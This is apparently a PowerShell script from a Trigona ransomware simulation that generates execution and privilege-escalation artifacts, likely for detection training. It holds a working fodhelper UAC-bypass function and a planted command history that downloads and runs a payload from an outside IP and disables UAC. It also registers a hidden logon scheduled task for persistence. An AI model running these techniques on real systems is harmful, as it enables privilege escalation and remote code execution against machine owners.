# ============================================================================
# TRIGONA RANSOMWARE SIMULATION - PHASE 2: EXECUTION & PRIVILEGE ESCALATION
# ============================================================================
# This script simulates how Trigona executed on the system and gained elevated
# privileges through UAC bypass techniques.
# ============================================================================

function Simulate-ExecutionAndPrivEsc {
    param($SimPaths, $IcedidPath)
    
    Write-Host "[+] Simulating Execution & Privilege Escalation..." -ForegroundColor Green
    
    # Create AnyDesk installer artifact
    $anyDeskPath = "$($SimPaths.Tools)\AnyDesk.exe"
    $fakeAnyDeskBytes = New-Object byte[] 2048
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($fakeAnyDeskBytes)
    [System.IO.File]::WriteAllBytes($anyDeskPath, $fakeAnyDeskBytes)
    
    # Create UAC bypass script
    $bypassScriptContent = '
function Bypass-UAC {
    # This is a simulation of UAC bypass techniques
    param([string]$command)
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(default)" -Value $command -Force

    # Trigger the bypass
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    
    # Clean up
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
}
'
    $bypassScriptPath = "$($SimPaths.Tools)\uac-bypass.ps1"
    Set-Content -Path $bypassScriptPath -Value $bypassScriptContent -Force
    
    # Create WMIC execution batch file
    $wmicCommand = "wmic process call create 'powershell.exe -ExecutionPolicy Bypass -File $bypassScriptPath'"
    $wmicScriptPath = "$($SimPaths.Tools)\exec.bat"
    Set-Content -Path $wmicScriptPath -Value $wmicCommand -Force
    
    # Create registry entries for UAC bypass simulation
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    
    # Generate PowerShell command history
    $historyCommands = @(
        "whoami /all",
        "Get-LocalGroupMember -Group Administrators",
        "Get-Process",
        "Invoke-WebRequest -Uri http://23.146.242.199/payload.ps1 -OutFile $env:TEMP\p.ps1",
        "Set-ExecutionPolicy Bypass -Scope Process -Force",
        "& $env:TEMP\p.ps1",
        "net user administrator",
        "net localgroup administrators",
        "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
    )
    
    $historyPath = "$($SimPaths.Logs)\PowerShell_history.txt"
    Set-Content -Path $historyPath -Value $historyCommands -Force
    
    # Modify registry to simulate UAC disabled
    New-Item -Path "HKCU:\Software\TrigonaSim\UAC" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\TrigonaSim\UAC" -Name "EnableLUA" -Value 0 -PropertyType DWord -Force | Out-Null
    
    # Create Windows event logs
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1338 -Message "SIMULATION: UAC bypass attempt detected from process ID: $PID" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1339 -Message "SIMULATION: Privilege escalation technique detected: UAC bypass using COM object" -EntryType Warning
    
    # Create a scheduled task for persistence post-escalation
    $elevatedTaskName = "SystemConfigManager"
    $elevatedAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"& '$($SimPaths.Tools)\uac-bypass.ps1'`""
    $elevatedTrigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName $elevatedTaskName -Action $elevatedAction -Trigger $elevatedTrigger -Force | Out-Null
    
    Write-Host "  [✓] Execution & Privilege Escalation artifacts created" -ForegroundColor Yellow
}